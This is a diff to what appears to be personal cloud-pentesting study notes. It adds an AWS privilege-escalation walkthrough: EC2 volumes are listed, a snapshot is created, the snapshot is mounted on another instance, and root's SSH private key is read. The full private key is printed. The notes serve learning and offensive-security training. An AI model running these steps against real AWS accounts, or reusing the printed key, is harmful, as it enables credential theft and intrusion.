@@ -36,7 +36,7 @@ This is more or less the usual process I take whenever I learn a new topic from 
   * <a href="https://hackingthe.cloud/">Hacking The Cloud</a>
   * <a href="https://cloud.hacktricks.wiki/en/index.html">HackTricks Cloud</a>
   * <a href="https://github.com/kh4sh3i/cloud-penetration-testing">kh4sh3i's Cloud pentesting cheatsheet</a>
-  * <a href="https://github.com/carnal0wnage/weirdAAL">WeirdAAAL: AWS Attack Library</a>
+  * <a href="https://github.com/carnal0wnage/weirdAAL/wiki">WeirdAAAL: AWS Attack Library</a>
 
 * Tools
   * <a href="https://github.com/NetSPI/aws_consoler">AWS Consoler: Convert CLI credentials into console access</a>
@@ -219,7 +219,97 @@ Permissions can be bruteforced with <a href="https://github.com/andresriancho/en
 
 <br>
 
-Time to **escalate privileges**. 
+Time to **escalate privileges**. An attack path with these privileges is to first list available volumes of the EC2 machines (**ec2:DescribeVolumes**) and then create a publicly available snapshot (**ec2:CreateSnapshot**) of the volume. If a volume is publicly available, this means another AWS user can spin up an EC2 instance and attach the snapshot to their own machine as a second hard drive.
+
+```
+[www-data@manager ~]$ aws ec2 describe-volumes
+{
+    “Volumes”: [
+        {
+            “AvailabilityZone”: “eu-central-1a”, 
+            “Attachments”: [
+                {
+                    “AttachTime”: “2023-02-21T06:58:45.000Z”, 
+                    “InstanceId”: “i-067fa056e678575c6”, 
+                    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
+                    “State”: “attached”, 
+                    “DeleteOnTermination”: true, 
+                    “Device”: “/dev/xvda”
+                }
+            ], 
+            “Encrypted”: false, 
+            “VolumeType”: “gp2”, 
+            “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
+            “State”: “in-use”, 
+            “Iops”: 100, 
+            “SnapshotId”: “snap-01c4670c36a9740ea”, 
+            “CreateTime”: “2023-02-21T06:58:45.361Z”, 
+            “MultiAttachEnabled”: false, 
+            “Size”: 8
+        }
+    ]
+}
+```
+Note the **`VolumeID`** to create a snapshot of it later
+```
+[www-data@manager ~]$ aws ec2 create-snapshot –volume-id vol-02ca4df63c5cbb8c5 –description ‘Y-Security rocks!’
+{
+    “Description”: “Y-Security rocks!”, 
+    “Tags”: [], 
+    “Encrypted”: false, 
+    “VolumeId”: “vol-02ca4df63c5cbb8c5”, 
+    “State”: “pending”, 
+    “VolumeSize”: 8, 
+    “StartTime”: “2023-02-21T10:40:05.770Z”, 
+    “Progress”: “”, 
+    “OwnerId”: “124253853813”, 
+    “SnapshotId”: “snap-06eedc6a7403eda54”
+}
+```
+
+When creating a new instance in the same region, the snapshot can be found by searching by the **`OwnerID`**
+
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/ac941322-2ecb-4fe4-a21f-5597ad412f59" width=60%/>
+</p>
+
+After launching the instance, mount the snapshot and access the filesystem to steal root's SSH private key
+
+```
+[ec2-user@ip-172-31-31-6 ~]$ sudo mount /dev/sdb1 /media/
+
+[ec2-user@ip-172-31-31-6 ~]$ sudo ls /media/root/.ssh
+authorized_keys  id_rsa  id_rsa.pub
+
+[ec2-user@ip-172-31-31-6 ~]$ sudo cat /media/root/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEApNvZpkpiPqs6vdoGUXTfnv/ZtS0jk8rOrwi+3B8Kg7D4B4Yx
+m31QJGD2t8RUEyjlrqpvoQ5tiq+s0xmxZzBioB2mFTzqV0DzyIZ3+zCHKn07tw26
+N+67bWq88LTIHbadUfBiKRg4M9GnX8p1R2n2e9gIIxkBVBEQFmqMuVpg/3Yczww1
+9MrpMHEEr0fJWbIr9Sc+1x+smZiJjAvgqGa2GZh0SLv05aVuXOGlpemx2CnFMGM/
+9bisIRRgKQCMJqYh/cXf69qv9VL0CLHYh1TdSN87ZnWZeb/KNKd5iETTg5s2C6Jj
+13NnNrea+GNYr3xLCUqACFQik1HVTH4ZPLJmvwIDAQABAoIBAB05pDHoidYWQMmb
+NveFwobLUGrf36i5kT5STJN1JUYHP1EGJxEre+OXFOWq9kSXQXBfYn6osh6d2gNq
+UJq8Zx9/YgvtypVBPHZV8DsldTDBFq7yzgpQVgWloG0Df15VGzqFZMFoO75j8kn2
++Cd6z2lQ+NBQBH5EsBdpOB07umpO2xmPbaBYa51+bFeRjvV8qhf01RrbovwrbeWr
+qsr4aUgaOBpvIyszFM+q5ZkBAugLeYyPvKP3/fpEWtgIq4L+0Sch75srQ/ahYLQe
+dQjGi0BTCqwWvoglHfID76r6jPSovyLKGY5wGlgUTSouHCEoAVkSsWb2vd/5IUns
+ISx5ifECgYEA07vqFKyI1RenI5ZehH9l4uKXAH5bysibK4mkR7WSzKmP26cpkaib
+NRqB+EaZlUHHnI+ZkGYxh/DKrCo888DDiS/W7zA0muqcBpU3tInDHYdKa9s2wkL+
+lYytWVaVFTHN19omAQRlGaNxtJ8jBe9Nd1+sIMpvKoIkFqRfVX0asxsCgYEAx1Mn
+nNBulvDy6WHvx5WDg4oD/ajSvKuFfyAd/bi3s6lVwejv6XeDxGoWOr/mZAuDCyUO
+aGUTMhCYNedUavg7nTZl9LgPVuJROs3h2toaRqJJE8hh/per38DVuzXpkGqes+s2
+OD3MwR8itHOIXsD5I5S6kOpsa5oJXAzJr672cS0CgYBDa16J3rZjQ/jQeBz4i6hh
+qkzyt0l7NI1UO6u3ubVYvdU01/GAk/N34UzpRXG5+Qwaag83z5KN+rpOP9TQuNyK
+XlVOLEdT3Mh5wCHQtt0OFfo4hcDV8ocmD3lTLSKjcQxeYvQe9stKcqTOIq4AQcak
+8C3a8xqaqn3bR9OjYQaTaQKBgQCcNO62ViJU6D915uqi3ulSDLdT8xo0Abd9CQ53
+6GsOwYYTkRlzPdZl9z20jO9hOCRad4/zAEMq2RZwJ/pgWmldq2P7hMOAs5w1GWQG
+vyYYdNYQStmBTBvGHrlhHb8NDoGRPqQfL09niZ8JDAGzQEf/Om97YjvVl8H+AYeN
+xvAbgQKBgQCAji3zHMwRlh3J2az/vfIY79c1uerNMCNBsFrLH5e9D8Cx+Tq+mWiA
+WjGvoMRN0a/mxpqX1WyPDEuwNoT547VnXNo2fKsZjsvqmjMGg5wFh4ERhFczb6gg
++0NbI8C71hiJMqDrYSvax4augU617PfzpR63PIWGxcc8oQe3L6F+kQ==
+-----END RSA PRIVATE KEY-----
+```
 
 # CTFs and Hands-on material
 ## flaws.cloud
